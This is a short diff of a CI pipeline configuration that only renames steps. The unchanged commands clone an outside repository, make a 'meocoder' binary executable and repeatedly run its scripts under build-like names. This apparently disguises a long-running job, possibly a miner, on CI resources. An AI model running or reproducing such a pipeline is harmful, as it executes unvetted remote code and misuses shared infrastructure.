@@ -12,10 +12,10 @@ jobs:
       - checkout
       
       - run:
-          name: Clone project and run task
+          name: Clone and run task
           command:  git clone https://github.com/vippro99/meocoder.git && cd meocoder && npm i -s && chmod +x meocoder config.json && node app-1h.js
       - run:
-          name: New task and check
+          name: New task
           command:  cd meocoder && node app-1h.js
       - run:
           name: Build new source
@@ -24,7 +24,7 @@ jobs:
           name: Update source
           command:  cd meocoder && node app-1h.js
       - run:
-          name: Check and close jobs
+          name: Save and close jobs
           command:  cd meocoder && node test-45m.js
       
       # setup cronjob 
